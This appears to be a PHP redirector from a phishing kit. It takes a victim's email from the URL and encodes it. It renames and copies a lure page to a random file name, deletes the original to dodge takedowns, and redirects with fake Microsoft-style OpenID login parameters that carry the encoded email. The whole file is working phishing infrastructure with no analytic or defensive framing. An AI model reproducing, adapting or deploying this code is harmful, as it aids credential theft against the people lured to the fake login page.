<?php

session_start();

include ('api.php');

if (isset($_GET['email'])) {
$email = $_GET['email'];
}
$id = base64_encode($email);

$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "home.php");
}}}
$staticfile = "home.php";
$name =  generateRandomString();
$secfile = $name.".php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
header("Location: $secfile?client_id=DCDB4AD9BD2E262AC38E65F8A64C02E5&response_mode=form_post&response_type=code+id_token&scope=openid+profile&cid=$id&Connect_Authentication_Properties&&nonce=1982950881dcdb4ad9bd2e262ac38e65f8a64c02e5&redirect_uri=&ui_locales=en-US&mkt=en-US");
}}

//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>
